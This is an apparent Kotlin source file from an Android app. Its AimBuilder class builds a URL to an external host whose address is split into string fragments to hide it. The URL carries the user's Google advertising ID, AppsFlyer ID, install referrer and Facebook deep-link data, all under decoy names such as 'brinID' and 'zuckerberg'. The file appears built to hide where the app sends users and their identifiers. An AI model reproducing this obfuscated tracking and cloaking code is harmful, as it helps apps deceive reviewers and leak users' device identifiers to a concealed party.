package gf.na.chisle.nia.data

import android.net.Uri

class AimBuilder {

    private var brinID: String = ""
    private var appsIdentif = ""
    private var appsData: MutableMap<String, Any?> = mutableMapOf()
    private var zuckerberg = ""
    private var installReferrer = ""

    fun setBrinID(inputBrinId: String) = apply { this.brinID = inputBrinId }
    fun setAppsIdentif(inputAppsIdentif: String) = apply { this.appsIdentif = inputAppsIdentif }
    fun setAppsData(inputAppsData: MutableMap<String, Any?>) =
        apply { this.appsData = inputAppsData }

    fun setZuckerberg(inputZuckerberg: String) = apply { this.zuckerberg = inputZuckerberg }
    fun setInstallReferrer(referrer: String) = apply { this.installReferrer = referrer }


    fun build(): String {
        val sb = StringBuilder()
        listOfDomain.forEach { sb.append(it) }
        val urlBuilder = Uri
            .parse(sb.toString())
            .buildUpon()

        urlBuilder.appendQueryParameter(APPSFLYER_ID_KEY, appsIdentif)
        urlBuilder.appendQueryParameter(GAD_ID_KEY, brinID)
        urlBuilder.appendQueryParameter(REFERRER, installReferrer)

        if (zuckerberg == NULL_ZUCK) {
            urlBuilder.appendQueryParameter(DEEP_KEY, NULL_ZUCK)
        } else {
            appendQueryParamForZuck(zuckerberg, urlBuilder)
        }

        appendQueryParamForApps(appsData, urlBuilder)

        return urlBuilder.build().toString()
    }

    private fun appendQueryParamForZuck(rawZuckString: String, uriBuilder: Uri.Builder) {
        rawZuckString.split("&").forEach { param ->
            val keyValue = param.split("=")
            if (keyValue.size == 2) {
                val key = keyValue[0]
                val value = keyValue[1]
                uriBuilder.appendQueryParameter(key, value)
            }
        }
    }

    private fun appendQueryParamForApps(
        rawAppsData: MutableMap<String, Any?>,
        uriBuilder: Uri.Builder
    ) {
        rawAppsData.forEach { (key, value) ->
            if (value != null && value.toString().isNotEmpty()) {
                uriBuilder.appendQueryParameter(key, value.toString())
            }
        }
    }

    companion object {
        val listOfDomain = listOf("ht", "tps", "://", "uzbuss", ".org/yYtvwj47")
        private const val APPSFLYER_ID_KEY = "appsflyerId"
        private const val GAD_ID_KEY = "gadid"
        private const val DEEP_KEY = "deep"
        private const val NULL_ZUCK = "null"
        private const val REFERRER = "reffer"
    }
}